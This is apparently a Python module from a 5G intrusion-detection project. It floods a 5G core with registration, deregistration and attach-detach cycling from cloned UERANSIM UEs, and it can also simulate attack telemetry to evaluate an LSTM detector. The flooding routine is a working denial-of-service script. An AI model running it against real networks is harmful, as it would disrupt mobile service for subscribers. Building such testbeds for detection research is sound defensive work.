"""
Signaling storm attack generator.

Simulates a zero‑day signaling storm by rapidly spawning cloned UERANSIM
UEs that flood the 5G core with:
  - Mass simultaneous NGAP registration requests
  - Repeated authentication failures
  - Rapid attach / detach cycling

When UERANSIM is not available, produces a *simulated* burst of attack
telemetry directly in memory for offline testing.
"""

from __future__ import annotations

import subprocess
import time
from pathlib import Path
from typing import Dict, List, Optional

import numpy as np
import pandas as pd

from core.ella_config import EllaConfig, get_config


def launch_signaling_storm(
    num_clones: int = 50,
    burst_duration_seconds: float = 30.0,
    attach_detach_interval: float = 0.3,
    ueransim_path: Optional[Path] = None,
    ue_config_path: Optional[Path] = None,
) -> List[Dict]:
    """
    Launch a signaling storm using UERANSIM cloned UEs.

    Each clone rapidly attaches and detaches, overwhelming the core
    with registration / deregistration signaling.

    Parameters
    ----------
    num_clones : int
        Number of simultaneous malicious UEs.
    burst_duration_seconds : float
        Total duration of the attack burst.
    attach_detach_interval : float
        Seconds between each attach/detach cycle.
    ueransim_path : Path, optional
        UERANSIM installation root.
    ue_config_path : Path, optional
        Path to the malicious UE YAML config.

    Returns
    -------
    list[dict]
        Logged attack events.
    """
    events: List[Dict] = []
    start = time.time()

    print(f"[attack] Launching signaling storm: {num_clones} clones, "
          f"{burst_duration_seconds}s burst")
    print(f"[attack] {'='*50}")

    if ueransim_path and ue_config_path:
        binary = ueransim_path / "build" / "nr-ue"
        processes = []

        # Phase 1: Probe
        print("[attack] Phase 1 (Probe): Spawning 5 UEs")
        for i in range(5):
            try:
                proc = subprocess.Popen(
                    ["sudo", str(binary), "-c", str(ue_config_path)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                processes.append(proc)
                events.append({"time": time.time(), "event": "PROBE_ATTACH"})
            except FileNotFoundError:
                break
            time.sleep(0.5)
            
        time.sleep(2.0) # wait before phase 2
        
        # Phase 2: Surge (burst array)
        print("[attack] Phase 2 (Surge): Sudden massive blocks")
        burst_groups = [10, 20, 20] # Split 50 clones 
        for burst in burst_groups:
            for i in range(burst):
                try:
                    proc = subprocess.Popen(
                        ["sudo", str(binary), "-c", str(ue_config_path)],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    processes.append(proc)
                except FileNotFoundError:
                    break
            print(f"[attack] Slammed core with sudden {burst} UE registrations!")
            events.append({"time": time.time(), "event": "SURGE_ATTACH", "count": burst})
            time.sleep(0.5) # Let core absorb the sudden block before next spike
            
        time.sleep(2.0)
        
        # Phase 3: Slam (rapid kill-spawn cycle)
        print("[attack] Phase 3 (Slam): Rapid Kill-Spawn cycles")
        slam_duration = burst_duration_seconds - (time.time() - start)
        if slam_duration > 0:
            end_time = time.time() + slam_duration
            while time.time() < end_time:
                # kill
                for proc in processes:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                processes.clear()
                events.append({"time": time.time(), "event": "SLAM_DETACH_ALL"})
                time.sleep(0.1)
                
                # spawn
                for i in range(20):
                    try:
                        proc = subprocess.Popen(
                            ["sudo", str(binary), "-c", str(ue_config_path)],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                        processes.append(proc)
                    except FileNotFoundError:
                        break
                events.append({"time": time.time(), "event": "SLAM_ATTACH_ALL", "count": 20})
                time.sleep(0.1)
                
        # Final cleanup
        for proc in processes:
            try:
                proc.kill()
            except Exception:
                pass
        processes.clear()
    else:
        # Simulation mode — just log events
        cycle = 0
        while (time.time() - start) < burst_duration_seconds:
            events.append({
                "time": time.time(),
                "event": "STORM_CYCLE",
                "cycle": cycle,
                "clones": num_clones,
            })
            cycle += 1
            print(f"[attack]   Storm cycle {cycle}: "
                  f"{num_clones} simultaneous registrations")
            time.sleep(attach_detach_interval)

    print(f"[attack] {'='*50}")
    print(f"[attack] Storm complete — {len(events)} events over "
          f"{time.time() - start:.1f}s")
    return events


def generate_attack_telemetry(
    duration_seconds: float = 60.0,
    poll_interval: float = 1.0,
    intensity: float = 1.0,
    seed: int = 123,
) -> pd.DataFrame:
    """
    Generate simulated *attack* telemetry matching the same schema as the
    normal telemetry from ``telemetry.collector``.

    This is the "attack" counterpart used for model evaluation when
    Ella Core is not running.

    Parameters
    ----------
    duration_seconds : float
        Duration of the attack data.
    poll_interval : float
        Sampling interval.
    intensity : float
        Multiplier (1.0 = default storm intensity, higher = worse).
    seed : int
        RNG seed.

    Returns
    -------
    pd.DataFrame
        Attack telemetry with spiked metrics.
    """
    from telemetry.collector import generate_simulated_telemetry

    # Use the same parametric sine+clone model as the live collector so
    # the LSTM sees statistically consistent attack signatures.
    df = generate_simulated_telemetry(
        duration_seconds=duration_seconds,
        poll_interval=poll_interval,
        attack_start_frac=0.0,                          # 100% attack window
        ue_clone_count_during_attack=int(20 * intensity),  # scale by intensity
        seed=seed,
    )
    print(f"[attack] Generated {len(df)} attack telemetry samples "
          f"(intensity={intensity:.1f}x, clones={int(20*intensity)})")
    return df


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import argparse
    from telemetry.collector import cleanup_stale_ue_processes

    parser = argparse.ArgumentParser(description="Launch signaling storm attack")
    parser.add_argument("--clones",    type=int,   default=50)
    parser.add_argument("--duration",  type=float, default=10.0)
    parser.add_argument("--simulated", action="store_true")
    parser.add_argument("--cleanup",   action="store_true",
                        help="Kill stale nr-ue processes before launching")
    args = parser.parse_args()

    if args.cleanup:
        n = cleanup_stale_ue_processes()
        print(f"[attack] Pre-run cleanup: killed {n} stale process(es).")

    if args.simulated:
        df = generate_attack_telemetry(duration_seconds=args.duration)
        print(df.head())
    else:
        from pathlib import Path
        project_root = Path(__file__).resolve().parents[1]
        ueransim_path = project_root / "UERANSIM"
        ue_config_path = project_root / "config" / "ue.yaml"
        events = launch_signaling_storm(
            num_clones=args.clones,
            burst_duration_seconds=args.duration,
            ueransim_path=ueransim_path,
            ue_config_path=ue_config_path,
        )
        print(f"Total events: {len(events)}")
